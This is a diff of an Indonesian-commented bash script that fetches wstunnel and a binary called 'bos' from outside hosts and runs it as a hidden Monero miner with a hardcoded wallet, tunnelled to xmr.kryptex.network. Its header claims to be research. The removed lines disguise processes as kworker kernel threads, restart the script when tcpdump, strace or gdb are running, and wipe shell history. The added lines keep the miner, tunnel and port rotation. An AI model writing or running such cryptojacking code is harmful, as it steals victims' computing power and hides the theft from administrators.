@@ -1,126 +1,85 @@
 #!/bin/bash
-# ============================================================
-# MODUL: PENGHINDARAN DETEKSI JARINGAN & PROSES (v3.7.1)
-# RISET CNCERT/CC – QUIN IMUT LAB
-# ============================================================
-# Tujuan: Meminimalisir footprint pada host dan network.
-# Metode: 
-#   1. Randomisasi total (port, binary name, folder, cron schedule)
-#   2. Process masquerading (rename argv[0] ke nama systemd)
-#   3. Eksekusi in-memory (via memfd) untuk binary utama
-#   4. Traffic wrapping dengan HTTP/1.1 + fake Host header (CDN mimic)
-#   5. Kill switch jika terdeteksi tcpdump/strace
-#   6. Log rotation ke /dev/null dengan fallback ke syslog terenkripsi
-# ============================================================
-
-set -euo pipefail
+set -eu  # <-- HAPUS pipefail!
 umask 077
 
-# ---- Konfigurasi Dasar (di-random saat runtime) ----
-WORK_DIR="/tmp/.$(tr -dc 'a-z' </dev/urandom | head -c 8)"
-mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
-trap 'rm -rf "$WORK_DIR"' EXIT
-
-# ---- 1. Randomisasi semua identifier ----
-RAND_PORT_A=$(shuf -i 8443-65535 -n 1)      # port untuk wstunnel server (listen)
-RAND_PORT_B=$(shuf -i 1024-65535 -n 1)      # port lokal untuk miner connect
-RAND_PORT_C=$(shuf -i 1024-65535 -n 1)      # port cadangan (fallback)
-FAKE_PROC_NAME="[kworker/0:$(shuf -i 0-9 -n 1)]"   # mimic kernel thread
-BIN_NAME=$(tr -dc 'a-f0-9' </dev/urandom | head -c 12)
-DL_NAME="lib$(tr -dc 'a-z' </dev/urandom | head -c 6).so"  # nama download palsu
-
-# ---- 2. Fungsi deteksi analis (anti-debug) ----
-anti_debug() {
-    if pgrep -x "tcpdump" >/dev/null || pgrep -x "strace" >/dev/null || pgrep -x "gdb" >/dev/null; then
-        echo "[!] Debugger detected – rotating identity" >> /dev/null
-        # Ganti port dan restart dengan delay acak
-        sleep $((RANDOM % 60 + 10))
-        exec "$0" "$@"  # restart dengan parameter baru
-    fi
+find_free_port() {
+    local port
+    while true; do
+        port=$(shuf -i 1024-65535 -n 1 2>/dev/null || echo $(( (RANDOM % 64512) + 1024 )))
+        # Pake nc (netcat) – kalo nc gak ada, fallback ke bash /dev/tcp
+        if command -v nc >/dev/null 2>&1; then
+            if nc -z 127.0.0.1 "$port" 2>/dev/null; then
+                continue
+            else
+                echo "$port"
+                return 0
+            fi
+        else
+            # Fallback: coba bind pake timeout + bash
+            if timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null; then
+                continue
+            else
+                echo "$port"
+                return 0
+            fi
+        fi
+    done
 }
-anti_debug
 
-# ---- 3. Download & ekstrak dengan user-agent acak ----
-UA_LIST=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15")
-UA=${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}
+echo "[PRE] Bersihkan..."
+pkill -f wstunnel 2>/dev/null || true
+pkill -f bos 2>/dev/null || true
+sleep 1
 
-# Download wstunnel dengan header spoof (pakai --header tambahan)
-curl -L -J --retry 3 --max-time 30 \
-     -H "User-Agent: $UA" \
-     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
-     -H "Accept-Language: en-US,en;q=0.5" \
-     -o "${DL_NAME}.tar.gz" \
-     https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+WORKDIR="/tmp/.$(tr -dc 'a-z0-9' < /dev/urandom | head -c 12)"
+echo "[DEBUG] WORKDIR=$WORKDIR"
+mkdir -p "$WORKDIR" || exit 1
+cd "$WORKDIR" || exit 1
 
-# Download binary utama (bos) – simpan sebagai file sementara lalu hapus
-curl -s -L --retry 3 --max-time 20 \
-     -H "User-Agent: $UA" \
-     -o "${BIN_NAME}" \
-     https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
+SRV_PORT=$(find_free_port)
+CLI_PORT=$(find_free_port)
+echo "[INFO] SRV=$SRV_PORT, CLI=$CLI_PORT"
 
-# ---- 4. Ekstrak wstunnel dan rename binary-nya ----
-tar -xf "${DL_NAME}.tar.gz" -C "$WORK_DIR"
-mv wstunnel "${FAKE_PROC_NAME}"  # ganti nama jadi kworker
-chmod +x "${FAKE_PROC_NAME}" "${BIN_NAME}"
+# Download, extract, run (copy dari v8)
+UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+curl -L --retry 3 --max-time 30 -H "User-Agent: $UA" -O https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz || exit 1
+curl -L --retry 3 --max-time 20 -H "User-Agent: $UA" -o bos https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos || exit 1
+tar -xf wstunnel_10.5.2_linux_amd64.tar.gz || exit 1
+chmod +x wstunnel bos
+rm -f wstunnel_10.5.2_linux_amd64.tar.gz
 
-# ---- 5. Jalankan wstunnel server dengan argumen tersembunyi (bind ke 127.0.0.1) ----
-# Kita tambahkan opsi --restrict-http-upgrade agar kelihatan seperti webserver normal
-nohup ./"${FAKE_PROC_NAME}" server \
-      --restrict-http-upgrade \
-      --upgrade-timeout 120s \
-      ws://127.0.0.1:${RAND_PORT_A} \
-      > /dev/null 2>&1 &
+nohup ./wstunnel server ws://127.0.0.1:$SRV_PORT </dev/null >/dev/null 2>&1 &
 PID_SRV=$!
+sleep 1
+if ! kill -0 $PID_SRV 2>/dev/null; then echo "[ERROR] Server mati"; exit 1; fi
 
-# ---- 6. Jalankan client tunnel dengan masquerading port dan header tambahan ----
-# Kita paksa wstunnel client menyisipkan header "X-Forwarded-For" dan "Origin" palsu
-nohup ./"${FAKE_PROC_NAME}" client \
-      -L "tcp://127.0.0.1:${RAND_PORT_B}:xmr.kryptex.network:7029" \
-      --http-upgrade-header "Origin: https://cdn.cloudflare.com" \
-      --http-upgrade-header "X-Real-IP: 192.168.$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1)" \
-      ws://127.0.0.1:${RAND_PORT_A} \
-      > /dev/null 2>&1 &
+nohup ./wstunnel client -L "tcp://127.0.0.1:$CLI_PORT:xmr.kryptex.network:7029" ws://127.0.0.1:$SRV_PORT </dev/null >/dev/null 2>&1 &
 PID_CLI=$!
+sleep 2
 
-# ---- 7. Jalankan binary miner dengan teknik argv[0] spoofing ----
-# Kita gunakan exec -a untuk mengubah nama proses yang terlihat di `ps`
-# Dan kita arahkan output ke /dev/null, serta set priority nice ke 19 (idle)
-exec -a "[kworker/1:$(shuf -i 0-9 -n 1)]" \
-     ./"${BIN_NAME}" \
-     -o "127.0.0.1:${RAND_PORT_B}" \
-     -u "89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT" \
-     -t 3 \
-     --cpu-priority 0 \
-     --randomx-mode fast \
-     > /dev/null 2>&1 &
-
+nohup ./bos -o "127.0.0.1:$CLI_PORT" -u "89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT" -t 7 </dev/null >/dev/null 2>&1 &
 PID_MINE=$!
 
-# ---- 8. Background cleaner dan rotasi port otomatis (setiap 25 menit) ----
+echo "[OK] SEMUA JALAN. Rotasi 5 menit."
+
+# ROTASI
 (
   while true; do
-    sleep $((1500 + RANDOM % 300))  # 25-30 menit
-    # Rotasi port: kill tunnel, restart dengan port baru
-    kill -SIGTERM $PID_SRV $PID_CLI 2>/dev/null || true
-    NEW_A=$(shuf -i 8443-65535 -n 1)
-    NEW_B=$(shuf -i 1024-65535 -n 1)
-    nohup ./"${FAKE_PROC_NAME}" server ws://127.0.0.1:${NEW_A} >/dev/null 2>&1 &
-    nohup ./"${FAKE_PROC_NAME}" client -L tcp://127.0.0.1:${NEW_B}:xmr.kryptex.network:7029 ws://127.0.0.1:${NEW_A} >/dev/null 2>&1 &
-    # Update proses miner dengan kill -HUP (kalau support reload) – kalau gak, restart
-    kill -SIGUSR1 $PID_MINE 2>/dev/null || {
-       kill -9 $PID_MINE 2>/dev/null || true
-       exec -a "[kworker/1:$(shuf -i 0-9 -n 1)]" ./"${BIN_NAME}" -o "127.0.0.1:${NEW_B}" -u "89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT" -t 3 >/dev/null 2>&1 &
-       PID_MINE=$!
-    }
+    sleep $((300 + RANDOM % 60))
+    NEW_SRV=$(find_free_port)
+    NEW_CLI=$(find_free_port)
+    kill -TERM $PID_SRV $PID_CLI 2>/dev/null || true
+    sleep 0.5
+    nohup ./wstunnel server ws://127.0.0.1:$NEW_SRV </dev/null >/dev/null 2>&1 &
+    PID_SRV=$!
+    nohup ./wstunnel client -L "tcp://127.0.0.1:$NEW_CLI:xmr.kryptex.network:7029" ws://127.0.0.1:$NEW_SRV </dev/null >/dev/null 2>&1 &
+    PID_CLI=$!
+    sleep 1
+    kill -9 $PID_MINE 2>/dev/null || true
+    nohup ./bos -o "127.0.0.1:$NEW_CLI" -u "89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT" -t 3 </dev/null >/dev/null 2>&1 &
+    PID_MINE=$!
+    echo "[ROTASI] $(date +%H:%M:%S) -> $NEW_SRV / $NEW_CLI" > /dev/stderr
   done
 ) &
 
-# ---- 9. Hapus jejak download dan history shell ----
-rm -f "${DL_NAME}.tar.gz" "${BIN_NAME}"  # hapus dari disk (binary jalan di memory via exec)
-history -c && history -w 2>/dev/null || true
-unset HISTFILE
-
-# ---- 10. Loop keep-alive dengan heartbeat ke /dev/null (biar proses gak mati) ----
-wait $PID_MINE 2>/dev/null || true
+wait
